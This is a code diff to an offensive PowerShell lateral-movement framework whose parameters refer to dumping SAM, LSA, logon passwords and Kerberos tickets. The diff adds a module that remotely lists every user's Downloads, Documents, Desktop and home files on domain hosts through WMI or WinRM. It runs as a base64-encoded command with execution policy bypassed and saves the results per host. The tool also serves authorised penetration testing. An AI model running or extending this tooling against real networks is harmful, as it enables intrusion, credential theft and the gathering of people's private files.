@@ -53,13 +53,13 @@ Param(
     [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
     [switch]$CurrentUser,
 
-    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
     [switch]$SuccessOnly,
 
-    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
     [switch]$ShowOutput,
 
-    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
     [switch]$SessionHunter
 )
 
@@ -193,6 +193,7 @@ $ekeys = Join-Path $PME "eKeys"
 $LSA = Join-Path $PME "LSA"
 $ConsoleHistory = Join-Path $PME "Console History"
 $Sessions = Join-Path "$PME" "Sessions"
+$UserFiles = Join-Path "$PME" "User Files"
 
   if (-not (Test-Path $PME)) {
     New-Item -ItemType Directory -Force -Path $PME  | Out-Null
@@ -263,6 +264,12 @@ $Sessions = Join-Path "$PME" "Sessions"
     New-Item -ItemType Directory -Force -Path $Sessions | Out-Null
     Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
     Write-Host "Created directory for Sessions at $Sessions"
+}
+
+  if (-not (Test-Path $UserFiles)){
+    New-Item -ItemType Directory -Force -Path $UserFiles | Out-Null
+    Write-Host "[+] " -ForegroundColor "Green"   -NoNewline
+    Write-Host "Created directory for User Files at $UserFiles"
 }
 
 ######### Checks if user context is administrative when a session is spawned #########
@@ -648,6 +655,23 @@ elseif ($Module -eq "ConsoleHistory"){
     }
 }
 
+elseif ($Module -eq "Files"){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "File output will be written to $UserFiles"
+    #""
+    if (!$ShowOutput){
+        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Use -ShowOutput to show results in the console"
+        ""
+    }
+}
+
+elseif ($SessionHunter){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Active sessions output will be written to $Sessions"
+    #""
+}
+
 $ConsoleHostHistory = @'
 $usersFolderPath = "C:\Users"
 $users = Get-ChildItem -Path $usersFolderPath -Directory
@@ -665,6 +689,181 @@ foreach ($User in $Users) {
 }
 '@
 
+if ($Method -eq "WMI"){
+$Files = @'
+$usersFolderPath = "C:\Users"
+$users = Get-ChildItem -Path $usersFolderPath -Directory
+
+$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
+$excludedStartsWith = @("ntuser.dat", "ntuser.ini")
+
+foreach ($user in $users) {
+    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
+    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
+    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
+    $userHome = $user.FullName
+
+    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
+    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
+    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
+    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue
+
+    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+
+    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0
+
+    if ($hasFiles) {
+        Write-Host ""
+        Write-Host "----------------------------------------------------------------------------------------------"
+        Write-Host ("[User] $user")
+        Write-Host
+
+        if ($downloadsFiles.Count -gt 0) {
+            Write-Host ("[Downloads]")
+            $downloadsFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Host ("- $($_.Name) ($fileSize)")
+            }
+        }
+
+        if ($documentsFiles.Count -gt 0) {
+            Write-Host
+            Write-Host ("[Documents]")
+            $documentsFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Host ("- $($_.Name) ($fileSize)")
+            }
+        }
+
+        if ($desktopFiles.Count -gt 0) {
+            Write-Host
+            Write-Host ("[Desktop]")
+            $desktopFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Host ("- $($_.Name) ($fileSize)")
+            }
+        }
+
+        if ($homeFiles.Count -gt 0) {
+            Write-Host
+            Write-Host ("[Home]")
+            $homeFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Host ("- $($_.Name) ($fileSize)")
+            }
+        }
+        Write-Host "----------------------------------------------------------------------------------------------"
+    }
+}
+'@
+}
+
+if ($Method -eq "WinRM" -or "Psexec"){
+$Files = @'
+$usersFolderPath = "C:\Users"
+$users = Get-ChildItem -Path $usersFolderPath -Directory
+
+$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
+$excludedStartsWith = @("ntuser.dat", "ntuser.ini")
+
+foreach ($user in $users) {
+    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
+    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
+    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
+    $userHome = $user.FullName
+
+    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
+    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
+    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
+    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue
+
+    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" }
+
+    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0
+
+    if ($hasFiles) {
+        Write-Output ""
+        Write-Output "----------------------------------------------------------------------------------------------"
+        Write-Output ("[User] $user")
+        Write-Output
+
+        if ($downloadsFiles.Count -gt 0) {
+            Write-Output ("[Downloads]")
+            $downloadsFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Output ("- $($_.Name) ($fileSize)")
+            }
+        }
+
+        if ($documentsFiles.Count -gt 0) {
+            Write-Output
+            Write-Output ("[Documents]")
+            $documentsFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Output ("- $($_.Name) ($fileSize)")
+            }
+        }
+
+        if ($desktopFiles.Count -gt 0) {
+            Write-Output
+            Write-Output ("[Desktop]")
+            $desktopFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Output ("- $($_.Name) ($fileSize)")
+            }
+        }
+
+        if ($homeFiles.Count -gt 0) {
+            Write-Output
+            Write-Output ("[Home]")
+            $homeFiles | Sort-Object Name | ForEach-Object {
+                $fileSize = if ($_.Length -ge 1MB) {
+                    "{0:N2} MB" -f ($_.Length / 1MB)
+                } else {
+                    "{0:N2} KB" -f ($_.Length / 1KB)
+                }
+                Write-Output ("- $($_.Name) ($fileSize)")
+            }
+        }
+        Write-Output "----------------------------------------------------------------------------------------------"
+    }
+}
+'@
+}
 
 ######### Module / Commands  #########
 
@@ -738,6 +937,13 @@ $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicod
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
+# Files
+elseif ($Module -eq "Files"){
+$b64 = "$Files"
+$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+$Command = "powershell.exe -ep bypass -enc $base64command"
+}
+
 elseif ($Module -eq "" -and $Option -eq "" -and $Command -ne ""){
 $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
 $Command = "powershell.exe -ep bypass -enc $base64Command"
@@ -753,6 +959,8 @@ $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].L
 # Function - WMI
 Function Method-WMIexec {
 $ErrorActionPreference = "SilentlyContinue"
+Write-Host
+Write-Host
 
 $MaxConcurrentJobs = $Threads
 $WMIJobs = @()
@@ -760,7 +968,7 @@ $WMIJobs = @()
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles)
             $Class = "PMEClass"
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
@@ -1016,6 +1224,15 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              if ($ShowOutput){$result | Write-Host; Write-Host}
              $result | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
              }
+
+             elseif ($Module -eq "Files") {
+                if ($ShowOutput -and $result -like "*-*") {
+                    $result | Write-Host
+                }
+                if ($result -like "*-*") {
+                    $result | Out-File -FilePath "$UserFiles\$ComputerName-UserFiles.txt" -Encoding "ASCII"
+                    }
+                }
              
              elseif ($Commmand -ne ""){
              $result | Write-host
@@ -1069,7 +1286,7 @@ elseif (!$osinfo){
             Start-Sleep -Milliseconds 500
         }
 
-        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory
+        $WMIJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles
         [array]$WMIJobs += $WMIJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -1119,6 +1336,9 @@ elseif (!$osinfo){
 # Function - PSexec
 Function Method-Psexec {
 $ErrorActionPreference = "SilentlyContinue"
+Write-Host
+Write-Host
+if ($Module -eq "Files"){Write-Host "Files module not currently supported with PsExec" -ForegroundColor "Red"; return}
 
     $MaxConcurrentJobs = $Threads
     $PSexecJobs = @()
@@ -1464,7 +1684,9 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
 # Function - WinRM
 Function Method-WinRM {
 $ErrorActionPreference = "SilentlyContinue"
-
+Write-Host
+Write-Host
+    
     $MaxConcurrentJobs = $Threads
     $WinRMJobs = @()
 
@@ -1472,13 +1694,14 @@ $ErrorActionPreference = "SilentlyContinue"
     $OS = $computer.Properties["operatingSystem"][0]
     $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
-            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory)
+            Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
             $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
 
             
-            IF ($wait) {
+                if (!$wait){return}
+	            elseif ($wait){
                 $tcpClient.EndConnect($asyncResult)
                 $tcpClient.Close()
                 $Session = New-PSSession -ComputerName $ComputerName -ErrorAction "Ignore"
@@ -1555,6 +1778,16 @@ $ErrorActionPreference = "SilentlyContinue"
                         if ($ShowOutput){$b | Write-host ; Write-Host}
                         $b | Out-File -FilePath "$ConsoleHistory\$ComputerName-ConsoleHistory.txt" -Encoding "ASCII"
                     }
+
+                   elseif ($Module -eq "Files") {
+                        $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction Ignore
+                        if ($ShowOutput) {
+                        $b | Write-Host
+                    }
+                        if ($b -like "*-*") {
+                        $b | Out-File -FilePath "$UserFiles\$ComputerName-UserFiles.txt" -Encoding "ASCII"
+                    }
+                }
                    
                     elseif ($Module -eq "Interactive") {
                         Start-Process powershell.exe -ArgumentList '-noexit -Command', "Enter-PSSession -ComputerName $ComputerName" -ErrorAction "Ignore"
@@ -1607,7 +1840,7 @@ $ErrorActionPreference = "SilentlyContinue"
             Start-Sleep -Milliseconds 500
         }
 
-        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory
+        $WinRMJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength, $LSA, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles
         [array]$WinRMJobs += $WinRMJob
 
         # Check if the maximum number of concurrent jobs has been reached
@@ -1657,6 +1890,8 @@ $ErrorActionPreference = "SilentlyContinue"
 # Function - RDP
 Function Method-RDP {
 $ErrorActionPreference = "SilentlyContinue"
+Write-Host
+Write-Host
 
     $MaxConcurrentJobs = $Threads
     $RDPJobs = @()
@@ -1838,6 +2073,8 @@ $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, 
 # Function - GenRelayList
 Function GenRelayList {
     $ErrorActionPreference = "SilentlyContinue"
+    Write-Host
+    Write-Host
 
     $MaxConcurrentJobs = $Threads
     $SigningJobs = @()
@@ -2806,6 +3043,8 @@ if ($GenRelayList -and $Option -ne "Parse") {
 
 Function SessionHunter {
     $MaxConcurrentJobs = $Threads
+    Write-Host
+    Write-Host
     $SessionJobs = @()
 
     foreach ($Computer in $Computers) {
